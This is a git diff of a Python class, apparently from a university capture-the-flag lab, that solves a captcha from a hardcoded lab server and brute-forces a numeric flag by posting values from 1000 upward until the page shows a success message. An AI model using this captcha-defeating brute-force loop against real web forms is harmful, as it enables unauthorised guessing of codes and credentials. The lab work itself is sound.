@@ -1,5 +1,7 @@
 from src.tp3.utils.captcha import Captcha
-
+from src.tp3.utils.config import logger
+import requests
+from bs4 import BeautifulSoup
 
 class Session:
     """
@@ -21,32 +23,52 @@ class Session:
         """
         self.url = url
         self.captcha_value = ""
-        self.flag_value = ""
+        self.flag_value = 1000
         self.valid_flag = ""
+        self.session = requests.Session()
 
     def prepare_request(self):
         """
         Prepares the request for sending by capturing and solving the captcha.
         """
         captcha_url = "http://31.220.95.27:9002/captcha.php"
-        captcha = Captcha(captcha_url)
+        captcha = Captcha(captcha_url, session=self.session)
         captcha.capture()
         captcha.solve()
 
         self.captcha_value = captcha.get_value()
-        self.flag_value = "FIXME"
-
+        self.session.cookies.get('PHPSESSID')
+        
     def submit_request(self):
         """
         Sends the flag and captcha.
         """
+        data = {
+            'flag' : self.flag_value,
+            'captcha' : self.captcha_value,
+            'submit' : "Envoyer"
+        }
+        logger.info(f"Flag : {data['flag']}, Captcha : {data['captcha']}")
+        response = self.session.post(self.url, data=data)
+        return response
 
-    def process_response(self):
+    def process_response(self, response: requests.Response) -> bool :
         """
         Processes the response.
         """
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        tagSuccess = soup.find('p', class_='alert-success')
 
-    def get_flag(self):
+        if tagSuccess:
+            full_text = tagSuccess.get_text(strip=True)
+            self.valid_flag = full_text.split()[-1]
+            return True
+        elif self.flag_value < 2000:
+            self.flag_value += 1
+            return False
+
+    def get_flag(self) -> str :
         """
         Returns the valid flag.
 
